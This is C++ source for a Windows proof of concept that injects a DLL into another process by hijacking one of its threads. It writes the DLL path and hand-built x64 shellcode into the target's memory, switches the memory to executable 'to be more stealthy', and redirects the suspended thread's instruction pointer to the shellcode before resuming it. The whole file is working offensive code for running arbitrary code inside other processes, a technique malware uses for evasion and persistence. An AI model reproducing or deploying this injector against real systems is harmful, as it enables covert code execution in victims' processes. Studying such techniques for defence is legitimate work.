#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <tchar.h>
#include <stdio.h>
#include <assert.h>

//Idea: Implement dll injection with minimal shellcode (because i have limited skills in assembly)
//prepare in c the loading process of the dll and replace usefull address right before the injection
//trough this approach, we obtain a modular shellcode that can integrate any DLL.


//disclaimer: for clarity, i have removed the protection; it's just a PoC :)
static DWORD Get_Thread_Id_From_ProcessId(DWORD pid) {
    HANDLE threads_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    Thread32First(threads_snapshot, &te32);
    do {
        if (te32.th32OwnerProcessID == pid) {
            CloseHandle(threads_snapshot);
            return te32.th32ThreadID;
        }
    } while (Thread32Next(threads_snapshot, &te32));

    CloseHandle(threads_snapshot);
    return 0;
}


int main()
{
    char dll_path[] = "C:/Users/antoine/source/repos/shellcode dll injection/x64/Debug/crusty.dll";
    DWORD pid = 18352;

    //get thread target id by process id and open process, it will be usefull to alloc memory from the process
    DWORD thread_id = Get_Thread_Id_From_ProcessId(pid);
    HANDLE process_handle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_VM_READ, FALSE, pid);

    //prepare the adress to be replace in the payload before injection
    FARPROC dll_load_function = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    char* dll_alloc = (char*)VirtualAllocEx(process_handle, nullptr, 2048, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


    int success = WriteProcessMemory(process_handle, dll_alloc, dll_path, sizeof(dll_path)+1, nullptr);

    //push rcx
    //mov r8, 0x1111111111111111
    //mov rcx, 0x1111111111111111
    //sub rsp, 0x20
    //call r8
    //sub rsp, 0x20
    //pop rcx
    //mov r8, 0x1111111111111111
    //jmp r11
    
    BYTE payload[46] = {
        0x51, 0x49, 0xb8, 
        0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, //dll_load_function will be injected here
        0x48, 0xb9, 
        0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, //dll_alloc 
        0x48, 0x83, 0xec, 0x20,
        0x41, 0xff, 0xd0,
        0x48, 0x83, 0xc4, 0x20,
        0x59,
        0x49, 0xb8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, //return to normal process address execution
        0x41, 0xff, 0xe0
    };

    //replace placeholder of dll_load_function and dll_alloc
    memcpy(payload + 3, &dll_load_function, sizeof(dll_load_function));
    memcpy(payload + 13, &dll_alloc, sizeof(dll_alloc));

    CONTEXT context;
    HANDLE thread_hijack = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_id);

    SuspendThread(thread_hijack);
    context.ContextFlags = CONTEXT_CONTROL;
    GetThreadContext(thread_hijack, &context);
    
    //copy the address of initial memory execution
    memcpy(payload + 0x23, &context.Rip, sizeof(context.Rip));

    //i use the space previously allocated to store my a payload (no need to re-alloc an other space 4096 is enought)
    WriteProcessMemory(process_handle, dll_alloc + sizeof(dll_path)+2, payload, sizeof(payload), nullptr);
    
    //to be more stealthy i split the read/write and the execution right
    DWORD old_protect = 0;
    VirtualProtectEx(process_handle, dll_alloc, 2048, PAGE_EXECUTE_READ, &old_protect);
    
    
    //change execution memory
    context.Rip = (DWORD64)dll_alloc + sizeof(dll_path) + 2;
    context.ContextFlags = CONTEXT_CONTROL;
    
    //apply modification
    SetThreadContext(thread_hijack, &context);

    //resume normal state
    ResumeThread(thread_hijack);
    CloseHandle(thread_hijack);
    CloseHandle(process_handle);

    return 0;
}